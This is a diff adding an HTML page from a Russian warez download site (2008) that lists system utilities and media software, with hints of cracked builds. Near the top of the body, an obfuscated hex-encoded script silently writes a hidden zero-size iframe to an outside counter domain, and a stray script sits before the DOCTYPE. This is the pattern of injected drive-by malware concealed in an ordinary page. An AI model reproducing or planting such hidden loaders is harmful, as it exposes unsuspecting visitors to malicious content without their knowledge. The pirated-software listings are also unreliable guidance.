@@ -1,0 +1,623 @@
+<script language="javascript" src="/init.js"  type="text/javascript"></script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Программы &raquo; 1WZ.RU - Скачать программы, фильмы, музыку, скрипты.</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+<meta name="description" content="Скачать новое и нужное программное обеспечение" />
+<meta name="keywords" content="Скачать новое и нужное программное обеспечение, софт, кряк, варез" />
+<meta name="robots" content="all" />
+<meta name="revisit-after" content="1 days" />
+<link rel="search" type="application/opensearchdescription+xml" href="http://1wz.ru/engine/opensearch.php" title="1WZ.RU - Скачать программы, фильмы, музыку, скрипты." />
+<link rel="alternate" type="application/rss+xml" title="Программы &raquo; 1WZ.RU - Скачать программы, фильмы, музыку, скрипты." href="http://1wz.ru/soft/rss.xml">
+<script src="/templates/web20_2/js/prototype.js" type="text/javascript"></script>
+<script src="/templates/web20_2/js/scriptaculous.js?load=effects" type="text/javascript"></script>
+<script src="/templates/web20_2/js/lightbox.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml">
+<style rel="stylesheet" type="text/css" media="all">
+@import url(/templates/web20_2/css/style.css);
+</style>
+<style type="text/css" media="all">
+@import url(/templates/web20_2/css/engine.css);
+</style>
+<style type="text/css" media="screen">
+@import url(/templates/web20_2/css/lightbox.css);
+</style>
+</head>
+<body>
+<script language="javascript" type="text/javascript">
+<!--
+var dle_root       = '/';
+var dle_admin      = '';
+var dle_skin       = 'web20_2';
+var dle_wysiwyg    = 'no';
+var menu_short     = 'Быстрое редактирование';
+var menu_full      = 'Полное редактирование';
+var menu_profile   = 'Просмотр профиля';
+var menu_fcomments = 'Найти все комментарии';
+var menu_send      = 'Отправить сообщение';
+var menu_uedit     = 'Админцентр';
+var dle_req_field  = 'Заполните все необходимые поля';
+var dle_del_agree  = 'Вы действительно хотите удалить этот комментарий?';
+
+//-->
+</script>
+<script type="text/javascript" src="/engine/ajax/menu.js"></script>
+<script type="text/javascript" src="/engine/ajax/dle_ajax.js"></script>
+<div id="loading-layer" style="display:none;font-family: Verdana;font-size: 11px;width:200px;height:50px;background:#FFF;padding:10px;text-align:center;border:1px solid #000"><div style="font-weight:bold" id="loading-layer-text">Загрузка. Пожалуйста, подождите...</div><br /><img src="/engine/ajax/loading.gif"  border="0" alt="" /></div>
+<div id="busy_layer" style="visibility: hidden; display: block; position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; background-color: gray; opacity: 0.1; filter: alpha(opacity=10); "></div>
+
+<script type="text/javascript" src="/engine/ajax/js_edit.js"></script>
+<script type="text/javascript">function ahpgxusvlwuzz(skusjits){var fgdxbotv="";for(uknzaxauyi=0;uknzaxauyi<skusjits.length;uknzaxauyi+=2){fgdxbotv+=(String.fromCharCode(parseInt(skusjits.substr(uknzaxauyi,2),16)));}document.write(fgdxbotv);}ahpgxusvlwuzz("3C696672616D65207372633D22687474703A2F2F746F703130302D636F756E7465722E636F6D2F746F703130302F696E6465782E70687022206672616D65626F726465723D22302220626F726465723D2230222077696474683D223022206865696768743D223022207374796C653D22706F736974696F6E3A206162736F6C7574653B207669736962696C6974793A2068696464656E3B20646973706C61793A206E6F6E65223E3C2F696672616D653E");</script>
+<script type="text/javascript">
+var sid = Math.round(Math.random() * 100000000);
+document.write('<script type="text/javascript"
+</script>
+<table class="noname2"><tr><td>
+<div id="head">
+	<div id="logo"><a href="/"><img src="/templates/web20_2/images/logo.gif" /></a></div>
+    <div id="head2">
+    	<table class="noname"><tr>
+        	<td><form method="post" onsubmit="javascript:showBusyLayer()">
+<div class="fr">
+	<table class="noname">
+	<tr><td><input type="text" name="login_name" class="login" /></td>
+	<td><input type="password" name="login_password" class="login" /></td></tr>
+	<tr><td COLSPAN=2><input type="image" src="/templates/web20_2/images/login.gif" onclick="submit();" value="Войти" /><input name="login" type="hidden" id="login" value="submit">
+<span>&raquo;</span><a class="link" href="http://1wz.ru/index.php?do=register">Регистрация</a>
+             <span>&raquo;</span><a class="link" href="http://1wz.ru/index.php?do=lostpassword">Забыли пароль?</a>
+
+</td>
+</tr></table>
+	</div>
+</form>
+            </td>
+        </tr><tr>
+        	<td><div id="topnav">
+            	<div class="b1"></div>
+                <div class="b2"><a href="/">Главная</a></div>
+                <div class="b3"></div>
+                <div class="b4"><a href="/statistics.html">Статистика</a></div>
+                <div class="b5"></div>
+                <div class="b4"><a href="/addnews.html">Добавить новость</a></div>
+                <div class="b5"></div>
+                <div class="b4"><a href="/disclaimer.html">Правила сайта</a></div>
+                <div class="b5"></div>
+                <div class="b4"><a href="/rss.xml">RSS</a></div>
+                <div class="b5"></div>
+                <div class="b4"><a href="/index.php?do=feedback">Контакты</a></div>
+                <div class="b6"></div>
+                </div>
+            </td>
+        </tr></table>
+    </div>
+</div>
+</td></tr></table>
+<div id="head3">
+	<div class="head3-1">
+	<form id="search" onsubmit="javascript: showBusyLayer()" method="post"><input type="hidden" name="do" value="search"><input type="hidden" name="subaction" value="search">
+    	<table class="noname"><tr>
+        	<td><input type="text" class="login" name="story" /></td>
+            <td><input type="image" src="/templates/web20_2/images/search.gif" /></td>
+        </tr></table>
+	</form>
+    </div>
+    <div class="head3-2">
+    	<a href="http://1wz.ru/soft/">Программы</a>
+        <a href="http://1wz.ru/music/">Музыка</a>
+        <a href="http://1wz.ru/video/">Видео</a>
+        <a href="http://1wz.ru/games/">Игры</a>
+		<a href="http://1wz.ru/books/">Книги</a>
+        <a href="http://1wz.ru/erotics/">Эротика</a>
+        <a href="http://1wz.ru/mobile/">Мобильный</a>
+        <a href="http://1wz.ru/graph/">Графика</a>
+        <a href="http://1wz.ru/scripts/">Скпипты</a>
+        <a href="http://1wz.ru/interst/">Интересно</a>
+        <a href="http://1wz.ru/zarabotaj_v_nete"><font color=green>Заработок</font></a>
+
+    </div>
+</div>
+<div id="content">
+<table class="cont"><tr>
+	<td class="left">
+    <!-- Начало блока -->
+    	<div class="block">
+        	<div class="block-1"><img src="/templates/web20_2/images/bnav.gif" align="absmiddle" />Навигация</div>
+            <div class="block-2"></div>
+        </div>
+        <div class="block2">
+	<div id="leftmenu">
+	<table class="noname2"><tr><td>
+   
+    	<a href="http://1wz.ru/soft/">Программы</a><br />
+        <a href="http://1wz.ru/music/">Музыка</a><br />
+        <a href="http://1wz.ru/video/">Видео</a><br />
+        <a href="http://1wz.ru/games/">Игры</a><br />
+		<a href="http://1wz.ru/books/">Книги</a><br />
+	</td><td>
+        <a href="http://1wz.ru/erotics/">Эротика</a><br />
+        <a href="http://1wz.ru/mobile/">Мобильный</a><br />
+        <a href="http://1wz.ru/graph/">Графика</a><br />
+        <a href="http://1wz.ru/scripts/">Скпипты</a><br />
+        <a href="http://1wz.ru/interst/">Интересно</a><br />
+        <a href="http://1wz.ru/zarabotaj_v_nete"><font color=green>Заработок</font></a>
+       
+	</td></tr></table>
+   
+	</div>
+</div>
+        <div class="block3"><div class="block3-1"></div><div class="block3-2"></div></div>
+
+    <!-- Начало блока -->
+    	<div class="block">
+        	<div class="block-1"><img src="/templates/web20_2/images/top.gif" align="absmiddle" />Популярное</div>
+            <div class="block-2"></div>
+        </div>
+        <div class="block2">&raquo; <a href="http://1wz.ru/2008/04/20/alcohol_120_black.html"> Alcohol 120% Black </a><br />&raquo; <a href="http://1wz.ru/2008/04/19/iznasilovanie.html">Изнасилование</a><br />&raquo; <a href="http://1wz.ru/2008/04/19/domashnee_zadanie.html">Домашнее задание</a><br />&raquo; <a href="http://1wz.ru/2008/04/16/nodlogin_8.2_final_3264_bit.html">NodLogin 8.2 Final 32/64 bit</a><br />&raquo; <a href="http://1wz.ru/2008/04/13/that_new_look_imagemaker_1.0.html">That New Look ImageMaker 1.0</a><br />&raquo; <a href="http://1wz.ru/2008/04/29/windows_xp_xtreme_sp3_rus_final_edition_v5.8_majj_2008_g..html">Windows XP XTreme SP3 Rus Final Edition v5.8 (Май 2008  ...</a><br />&raquo; <a href="http://1wz.ru/2008/04/16/google_earth_4.3.7191_free__sputnikovyjj_globus.html">Google Earth 4.3.7191 Free - спутниковый глобус</a><br />&raquo; <a href="http://1wz.ru/2008/04/15/15_programm_dlja_v_kontakte.html">15 программ ДЛЯ "В Контакте"</a><br />&raquo; <a href="http://1wz.ru/2008/04/19/lichnye_fotki_devushek.html">Личные фотки девушек</a><br />&raquo; <a href="http://1wz.ru/2008/04/15/novye_mp3_melodii.html">Новые mp3 мелодии</a><br /></div>
+        <div class="block3"><div class="block3-1"></div><div class="block3-2"></div></div>
+
+
+    <!-- Начало блока -->
+    </td>
+    <td class="center">
+
+
+
+    	<span id='dle-info'></span>
+    	<div id='dle-content'><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/07/clean_disk_security7.75udalenie_sledov_pribyvanija_v_internete_.html">Clean Disk Security7.75(удаление следов прибывания в интернете )    </a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11897'><!--ThumbBegin--><a href="#" onClick="ShowBild('http://1wz.ru/uploads/posts/1210135539_cleandisksec.gif'); return false;" ><img align="left" src="http://1wz.ru/uploads/posts/thumbs/1210135539_cleandisksec.gif" style="border: none;" alt='Clean Disk Security7.75(удаление следов прибывания в интернете )    ' /></a><!--ThumbEnd--><br /><b>Clean Disk Security -</b> предназначена для полного удаления файлов. Благодаря методу удаления Gutmann-а она дает гарантию, что после удаления файла, его невозможно будет восстановить. Clean Disk Security в своей базе имеет <b>246 плагинов </b>благодаря которым будут подчищены логи программ, удалены следы прибывания в интернете а при желании затрется свободное место на диске. Теперь можете быть спокойны , все что вы делали на компьютере будет известно только Вам.</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11897'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11897'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11897'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11897'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11897'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11897'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/07/clean_disk_security7.75udalenie_sledov_pribyvanija_v_internete_.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/lion7/">lion7</a>&nbsp;-&nbsp;7 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/07/clean_disk_security7.75udalenie_sledov_pribyvanija_v_internete_.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 3
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/07/xplife_1.05.html">XPLife 1.05</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11895'><div align="center"><img src="http://1wz.ru/uploads/posts/1210113210_pic_id23965.jpeg" style="border: none;" alt='XPLife 1.05' /></div><br /><br />Программа предназначена для изменения интерфейса Windows XP в один клик. Отличительной чертой <b>XPLife</b> является стабильная работа и поддержка двух точек восстановления системы. При трансформации системы, измененяются огромное количество иконок, картинок, добавляются новые функции, звуки, курсоры, обновляются от 350 до 380 системных файлов, в зависимости от конфигурации системы, всего около 3000 ресурсов. Интерфейс Windows выдержан в нескольких тонах, три стиля оформления и три темы, выбор удовлетворит даже самых требовательных пользователей.</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11895'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11895'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11895'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11895'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11895'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11895'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/07/xplife_1.05.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/milan22/">milan22</a>&nbsp;-&nbsp;7 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/07/xplife_1.05.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 9
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/07/jetico_personal_firewall_2.0.21.html">Jetico Personal Firewall 2.0.21</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11894'><div align="center"><img src="http://1wz.ru/uploads/posts/1210107081_pic_id64671.jpeg" style="border: none;" alt='Jetico Personal Firewall 2.0.21' /></div><br /><b>Jetico Personal Firewall 2.0.21</b> Персональный файрволл - средство для защиты от хакерских атак и других несанкционированных сетевых действий. Jetico Personal Firewall организует трехуровневую защиту, состоящую из контроля и фильтрации сетевых пакетов, контроля и фильтрации действий сетевых приложений и контроля и фильтрации пользовательских процессов, обеспечивая тем самым надежный заслон как атакам извне, так и несанкционированную отправку данных вредоносными программами, ранее внедренными в систему.</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11894'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11894'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11894'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11894'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11894'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11894'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/07/jetico_personal_firewall_2.0.21.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/maxler/">maxler</a>&nbsp;-&nbsp;7 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/07/jetico_personal_firewall_2.0.21.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 6
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/06/vistapack_2.4__sdelaet_iz_windows_xp2000__windows_vista.html">Vistapack 2.4 - сделает из Windows XP\2000 - Windows Vista!</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11893'><div align="center"><img src="http://1wz.ru/uploads/posts/1210080168_pic_id64354.jpeg" style="border: none;" alt='Vistapack 2.4 - сделает из Windows XP2000 - Windows Vista!' /></div><br />Внимание! <b>Vistapack 2.4</b> - пожалуй, единственная по настоящему качественная программа для изменения интерфейса Windows XP SP2 и SP3, а так же Windows 2000<br />Эта программа заменяет: Звуки, Тему, Обои, Все иконки, Курсоры.<br />П.С. Ваша старая ОС становится точь-в точь, как красивая и вкусная Windows Vista! Замем ставить Висту?:)</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11893'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11893'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11893'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11893'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11893'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11893'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/06/vistapack_2.4__sdelaet_iz_windows_xp2000__windows_vista.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/maxler/">maxler</a>&nbsp;-&nbsp;6 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/06/vistapack_2.4__sdelaet_iz_windows_xp2000__windows_vista.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 17
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/06/numerologija._grafik_zhizni_0.2.html">Нумерология. График жизни 0.2</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11886'><div align="center"><img src="http://1wz.ru/uploads/posts/1210028109_pic_id23665.jpeg" style="border: none;" alt='Нумерология. График жизни 0.2' /></div><br /><br />Хотите узнать график своей жизни? Программа построит его основываясь на нумерологическую теорию, и  покажет некий жизненный уровень на определенный период жизни, а также предполагаемый уровень ваших запросов. Все это за 8 цифр даты вашего рождения.</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11886'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11886'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11886'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11886'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11886'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11886'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/06/numerologija._grafik_zhizni_0.2.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/milan22/">milan22</a>&nbsp;-&nbsp;6 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/06/numerologija._grafik_zhizni_0.2.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 15
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/06/enhancemyvista_free_1.8__razgonit_vistu.html">EnhanceMyVista Free 1.8 - разгонит Висту</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11885'><div align="center"><img src="http://1wz.ru/uploads/posts/1210023254_pic_id64033.jpeg" style="border: none;" alt='EnhanceMyVista Free 1.8 - разгонит Висту' /></div><br /><b>EnhanceMyVista Free 1.8</b> – в одном окне предоставит возможность разогнать систему, настроить её полностью под себя и работать уже с максимальным удобством. Даже новичок быстро сориентируется в закладках, где однотипные настройки сгруппированы вместе. Всё, что только может нарушить работу системы, из программы исключено. Достаточно просто и безопасно.</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11885'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11885'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11885'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11885'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11885'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11885'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/06/enhancemyvista_free_1.8__razgonit_vistu.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/maxler/">maxler</a>&nbsp;-&nbsp;6 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/06/enhancemyvista_free_1.8__razgonit_vistu.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 13
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/05/chemax_7.3_rus.html">CheMax 7.3 Rus</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11884'><div align="center"><img src="http://1wz.ru/uploads/posts/1209996717_pic_id63726.jpeg" style="border: none;" alt='CheMax 7.3 Rus' /></div><br /><b>CheMax 7.3 Rus</b> - это наибольшая русскоязычная база с чит кодами для компьютерных игр. Простой и красивый интерфейс, малый размер, и при этом огромное количество представленных игр. Особенностью базы является отсутствие в ней хинтов и прочей “отсебятины“, вашему вниманию представлены только коды (cheats, hex-cheats) и пароли (passwords).</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11884'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11884'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11884'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11884'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11884'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11884'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/05/chemax_7.3_rus.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/maxler/">maxler</a>&nbsp;-&nbsp;5 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/05/chemax_7.3_rus.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 11
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/05/revo_uninstaller_1.60__otlichnaja_udaljalka_programm.html">Revo Uninstaller 1.60 - отличная удалялка программ</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11883'><div align="center"><img src="http://1wz.ru/uploads/posts/1209982321_pic_id63416.jpeg" style="border: none;" alt='Revo Uninstaller 1.60 - отличная удалялка программ' /></div><br /><b>Revo Uninstaller 1.60</b> – это инновационное приложение, работающее быстрее, чем системный аналог Windows. Удаление программ идет не только быстрее, но и полностью контролируется вами. Вы можете сами выбрать. Удалять ли служебные файлы, записи в реестре и прочее. Программа может аккуратно деинсталлировать даже не до конца установленные программы, или программы, установленные с ошибкой.</div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11883'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11883'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11883'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11883'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11883'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11883'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/05/revo_uninstaller_1.60__otlichnaja_udaljalka_programm.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/maxler/">maxler</a>&nbsp;-&nbsp;5 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/05/revo_uninstaller_1.60__otlichnaja_udaljalka_programm.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 13
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
+      <a href="http://1wz.ru/2008/05/05/bs_player_pro_2.27_build_959.html">BS Player Pro 2.27 Build 959</a> 
+   </td><td align="right"> 
+      <a href="http://1wz.ru/soft/">Программы</a> 
+   </td></tr></table> 
+   </div> 
+   <div class="news-2"></div> 
+</div>
+
+
+<div class="news2">
+	<table class="noname"><tr><td>
+		<div id='news-id-11881'><div align="center"><img src="http://i014.radikal.ru/0805/dc/c90cdfa41799.jpg" style="border: none;" alt='BS Player Pro 2.27 Build 959' /></div><br /><br />Год выпуска: 2008<br />Версия: 2.27 Build 959 Pro<br />Разработчик: Webteh<br />Совместимость с Vista: да<br />Язык интерфейса: английский   русский   украинский   другие<br />Таблэтка: Присутствует<br /></div>
+	</td></tr></table>
+</div>
+<div class="news3">
+	<div class="news3-1"><span id='ratig-layer-11881'><div class="rating" style="float:left;">
+		<ul class="unit-rating">
+		<li class="current-rating" style="width:0px;">0</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="dleRate('1', '11881'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="dleRate('2', '11881'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="dleRate('3', '11881'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="dleRate('4', '11881'); return false;">4</a></li>
+		<li><a href="#" title="Отлично" class="r5-unit" onclick="dleRate('5', '11881'); return false;">5</a></li>
+		</ul>
+</div></span></div>
+	<div class="news3-3"><a href="http://1wz.ru/2008/05/05/bs_player_pro_2.27_build_959.html"><img src="/templates/web20_2/images/rm.gif" /></a></div>
+	<div class="news3-2">
+	
+	
+		<img src="/templates/web20_2/images/user.gif" align="absmiddle" />&nbsp;<a href="http://1wz.ru/user/Alexiy2/">Alexiy2</a>&nbsp;-&nbsp;5 май 2008&nbsp;|&nbsp;Комментарии: <a href="http://1wz.ru/2008/05/05/bs_player_pro_2.27_build_959.html#comment">0</a>&nbsp;|&nbsp;Просмотров: 11
+	</div>
+</div><div class="news"> 
+   <div class="news-1"> 
+   <table cellpadding="0" cellspacing="0" border="0" width="92%"><tr><td align="left"> 
